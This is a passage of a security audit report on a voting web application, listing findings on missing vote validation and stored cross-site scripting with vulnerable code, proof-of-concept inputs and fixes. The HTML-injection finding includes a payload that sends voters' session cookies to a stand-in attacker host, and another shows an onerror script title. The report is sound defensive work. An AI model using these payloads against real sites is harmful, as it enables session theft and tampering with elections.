## Findings

### Medium Severity

#### ASVS-1309-MED-001: Missing Vote Data Sanitization Before Storage

**Severity:** MEDIUM  
**Gap Type:** Type B — Control EXISTS (comment acknowledges need) but NOT IMPLEMENTED (false confidence)

**Location:**
- **File:** `v3/steve/election.py`
- **Function:** `add_vote()`
- **Line:** 216

**Related Functions:**
- `v3/server/pages.py`, function `do_vote_endpoint()`, lines 424–440

**Description:**

The application accepts arbitrary vote strings from user input without validating them against the issue's vote type before encryption and storage. A TODO comment at line 216 indicates awareness of this requirement, but the validation was never implemented.

**Vulnerable Code (`election.py:214-223`):**

```python
def add_vote(self, pid: str, iid: str, votestring: str):
    "Add VOTESTRING as the (latest) vote by PID for IID."

    # The Election should be open.
    md = self._all_metadata(self.S_OPEN)

    ### validate VOTESTRING for ISSUE.TYPE voting   # <-- TODO, never implemented

    mayvote = self.q_get_mayvote.first_row(pid, iid)
    vote_token = crypto.gen_vote_token(md.opened_key, pid, iid, mayvote.salt)

    # Pass MAYVOTE.SALT for PBKDF.
    ciphertext = crypto.create_vote(vote_token, mayvote.salt, votestring)

    self.c_add_vote.perform(vote_token, ciphertext)
```

**Vulnerable Code (`pages.py:424-440`):**

```python
# Extract votes from form (keys like 'vote-<iid>')
votes = {}
for key, value in form.items():
    if key.startswith('vote-'):
        iid = key.split('-', 1)[1]
        votes[iid] = value
# ...
for iid, votestring in votes.items():
    # ...
    election.add_vote(result.uid, iid, votestring)
```

**Data Flow:**

```
POST form data (user-controlled 'value') 
  → do_vote_endpoint() extracts raw value 
  → election.add_vote(pid, iid, votestring) 
  → NO validation against issue vote type 
  → crypto.create_vote() encrypts and stores
  → Later: tally_issue() decrypts → vtypes.tally() processes unvalidated data
```

**Proof of Concept:**

```http
POST /do-vote/VALID_EID HTTP/1.1
Content-Type: application/x-www-form-urlencoded

vote-VALID_IID=INVALID_GARBAGE_STRING_NOT_Y_N_OR_A
```

For a YNA issue, the server accepts any string (not just `y`, `n`, `a`). For STV, any string is accepted (not just valid comma-separated candidate labels).

**Impact:**

Arbitrary vote strings are encrypted and stored. During tallying, the `vtypes` module receives unvalidated data that could cause tally errors, crashes, or incorrect election results. In a voting system, integrity of recorded votes is critical.

**Remediation:**

```python
def add_vote(self, pid: str, iid: str, votestring: str):
    md = self._all_metadata(self.S_OPEN)

    # Validate votestring against issue type
    issue = self.q_get_issue.first_row(iid)
    if not issue:
        raise IssueNotFound(iid)
    
    m = vtypes.vtype_module(issue.type)
    if not m.validate_vote(votestring, self.json2kv(issue.kv)):
        raise InvalidVote(iid, votestring)

    mayvote = self.q_get_mayvote.first_row(pid, iid)
    vote_token = crypto.gen_vote_token(md.opened_key, pid, iid, mayvote.salt)
    ciphertext = crypto.create_vote(vote_token, mayvote.salt, votestring)
    self.c_add_vote.perform(vote_token, ciphertext)
```

#### ASVS-1309-MED-002: HTML Injection via Unsanitized Description in `rewrite_description`

**Severity:** MEDIUM  
**Gap Type:** Type A — Entry point with NO sanitization control

**Location:**
- **File:** `v3/server/pages.py`
- **Function:** `rewrite_description()`
- **Lines:** 27–35

**Related Functions:**
- Template: `v3/server/templates/vote-on.ezt`, line rendering `[issues.description]`

**Description:**

The `rewrite_description()` function processes issue descriptions to convert `doc:filename` patterns into HTML links. However, it does not sanitize the filename or description content before constructing HTML, allowing HTML injection through specially crafted filenames.

**Vulnerable Code (`pages.py:27-35`):**

```python
def rewrite_description(issue):
    """Rewrite issue description: wrap in <pre> and convert doc:filename to links."""
    import re
    desc = issue.description
    # Replace doc:filename with <a> link
    def repl(match):
        filename = match.group(1)
        return f'<a href="/docs/{issue.iid}/{filename}">{filename}</a>'
    desc = re.sub(r'doc:([^\s]+)', repl, desc)
    # Wrap in <pre>
    issue.description = f'<pre>{desc}</pre>'
```

**Data Flow:**

```
Election admin submits issue description via POST /do-add-issue/<eid>
  → form.description stored in DB (no sanitization, SQL injection prevented by parameterization)
  → vote_on_page() calls rewrite_description(issue)
  → regex extracts filename from 'doc:FILENAME' patterns
  → filename injected into <a href="..." > without HTML attribute escaping
  → result assigned as raw HTML string
  → EZT template outputs [issues.description] without escaping
  → Voter's browser executes injected content
```

**Proof of Concept:**

An election admin creates an issue with this description:

```
Please review doc:"onclick="fetch('https://evil.example/steal?c='+document.cookie)" before voting.
```

The regex `r'doc:([^\s]+)'` matches and extracts `"onclick="fetch('https://evil.example/steal?c='+document.cookie)"` as `filename`.

The generated HTML becomes:

```html
<pre>Please review <a href="/docs/IID/"onclick="fetch('https://evil.example/steal?c='+document.cookie)"">"onclick="fetch('https://evil.example/steal?c='+document.cookie)"</a> before voting.</pre>
```

This injects an `onclick` handler into the `<a>` tag. When any voter clicks the link, their session cookie is exfiltrated.

**Impact:**

Stored XSS affecting all voters viewing an election. In a voting system, this could be used to steal voter sessions, manipulate the displayed ballot, or influence voting behavior. The missing authorization checks (noted `### check authz` comments on issue creation/editing endpoints) widen the attack surface to any authenticated committer.

**Remediation:**

```python
import html

def rewrite_description(issue):
    """Rewrite issue description safely."""
    import re
    desc = html.escape(issue.description or '')  # Escape HTML entities first
    def repl(match):
        filename = match.group(1)
        safe_filename = html.escape(filename)
        return f'<a href="/docs/{html.escape(issue.iid)}/{safe_filename}">{safe_filename}</a>'
    desc = re.sub(r'doc:([^\s]+)', repl, desc)
    issue.description = f'<pre>{desc}</pre>'
```

#### ASVS-1309-MED-003: Inconsistent Output Encoding in EZT Templates

**Severity:** MEDIUM  
**Gap Type:** Type B — Escaping control EXISTS (`[format "js,html"]`) but NOT APPLIED at most output points

**Location:**
- **Files:** Multiple templates and `pages.py`

**Related Functions:**
- Multiple template files: `manage.ezt`, `manage-stv.ezt`, `flashes.ezt`
- Multiple flash message calls in `pages.py`

**Description:**

The EZT template engine supports output escaping via `[format]` directives, and this is correctly used in some JavaScript contexts. However, the majority of template outputs rendering user-sourced data do not apply any escaping, resulting in stored XSS vulnerabilities.

**Evidence of control existence (`manage.ezt`, lines using escaping):**

```html
onclick="openEditIssueModal('[issues.iid]',
                            '[format "js,html"][issues.title][end]',
                            '[format "js,html"][issues.description][end]')"
```

**Evidence of control NOT applied (same file, `manage.ezt`):**

```html
<strong>[issues.title]</strong>
<!-- ... -->
<div id="description-[issues.iid]" class="description mt-2">[issues.description]</div>
```

**Additional unescaped outputs in `flashes.ezt`:**

```html
[flashes.message]
```

**Where flash messages include user content (`pages.py`):**

```python
await flash_success(f'Created election: {form.title}')           # line ~472
await flash_success(f'Issue "{form.title}" has been added.')     # line ~531
await flash_danger(f'Invalid issue ID: {iid}')                  # line ~439
```

**Data Flow (stored XSS via title):**

```
Admin POST /do-add-issue/<eid> with title="<img src=x onerror=alert(1)>"
  → Stored in DB via parameterized query
  → manage.ezt renders: <strong>[issues.title]</strong>
  → EZT outputs raw: <strong><img src=x onerror=alert(1)></strong>
  → XSS executes for any user viewing the election management page
```

**Impact:**

Stored XSS in election titles and descriptions affects all users who view elections (voters, other admins). The EZT escaping directive exists and is used in 4 locations but is missing from approximately 30+ template output points rendering user-sourced data.

**Remediation:**

Either configure EZT for default escaping, or systematically apply `[format "html"]` to all user-sourced template variables. For flash messages, sanitize content before calling `quart.flash()`:

```python
import html

async def do_create_endpoint():
    # ...
    safe_title = html.escape(form.title)
    await flash_success(f'Created election: {safe_title}')
```

## Architecture Observations

1. **No memcache or caching layer exists** — ASVS 1.3.9 is not directly applicable to this application. The data path is: user → Quart web framework → `asfpy.db` → SQLite, with no intermediate cache.

2. **SQL injection risk is well-mitigated** — The `asfpy.db` + `queries.yaml` pattern centralizes all queries with parameter binding. No string concatenation for SQL was found anywhere.

3. **Template escaping is opt-in, not default** — EZT requires explicit `[format]` directives for escaping. The developers demonstrate knowledge of this (used in JS contexts) but have not applied it systematically across HTML body outputs.

4. **Vote data integrity gap** — The system encrypts votes for confidentiality but does not validate vote format before encryption. The TODO comment at `election.py:216` indicates awareness but the control was never implemented, creating a false confidence scenario.

### Long-term Actions

- Consider implementing Content Security Policy (CSP) headers to provide defense-in-depth against XSS
- Implement authorization checks at all issue creation/editing endpoints (currently marked with `### check authz` comments)
- Consider migrating to a template engine with automatic escaping by default
- Implement comprehensive input validation framework with centralized validation rules
